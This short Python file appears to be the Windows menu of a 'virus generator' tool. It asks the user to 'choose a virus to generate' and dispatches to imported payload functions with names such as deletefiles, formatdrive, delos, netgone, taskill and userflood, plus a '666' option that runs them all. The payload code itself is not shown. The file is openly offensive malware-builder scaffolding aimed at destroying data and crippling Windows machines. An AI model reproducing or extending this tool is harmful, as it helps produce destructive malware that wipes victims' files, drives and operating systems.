import os, time
from .banner import *
from conf.exe.winvir import *


def windows():
	banner2()
	winhelp()
	while True:
		print(c+"choose a virus to generate!")
		ui = input(g+"win > ")
		if(ui == '-h'):
			winhelp()

		elif(ui == '1'):
			overload()

		elif(ui == '2'):
			deletefiles()
		
		elif(ui == '3'):
			bsof()
		
		elif(ui == '4'):
			foolkey()
		
		elif(ui == '5'):
			formatdrive()
		
		elif(ui == '6'):
			shutdown()
		
		elif(ui == '7'):
			userflood()
		
		elif(ui == '8'):
			delos()
		
		elif(ui == '9'):
			infnotepads()
		
		elif(ui == '10'):
			Bomb()
		
		elif(ui == '11'):
			taskill()

		elif(ui == '12'):
			netgone()

		elif(ui == '666'):
			netgone()
			taskill()
			Bomb()
			infnotepads()
			delos()
			userflood()
			shutdown()
			formatdrive()
			foolkey()
			bsof()
			bsof()
			deletefiles()
			overload()


		elif(ui == '0'):
			return()
		
		else:
			print("Error!, Try executin -h")
			winerror()

		

